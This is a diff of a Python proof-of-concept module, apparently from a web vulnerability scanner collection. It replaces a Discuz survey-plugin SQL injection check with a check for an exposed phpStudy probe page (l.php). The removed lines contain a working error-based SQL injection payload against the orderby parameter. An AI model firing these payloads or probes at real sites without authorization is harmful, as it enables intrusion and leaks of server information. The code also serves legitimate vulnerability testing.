@@ -1,11 +1,10 @@
-
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: discuz问卷调查参数orderby注入漏洞
-referer: http://0day5.com/archives/3184/
+name: phpstudy探针
+referer: unknown
 author: Lucifer
-description: 文件plugin.php中,参数orderby存在SQL注入。
+description: phpstudy默认存在探针l.php,泄露敏感信息。
 '''
 import sys
 import requests
@@ -17,14 +16,15 @@ def poc(url):
     headers = {
         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
     }
-    payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
+    payload = "/l.php"
     vulnurl = url + payload
     try:
         req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-        if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
+        if r"phpStudy" in req.text and r"php_version" in req.text:
+            # print("[+]存在phpstudy探针...(信息)\tpayload: "+vulnurl)
             return {'payload': vulnurl, 'post_data': '', 'info': ''}
         else:
-           pass
+            pass
 
     except:
         pass
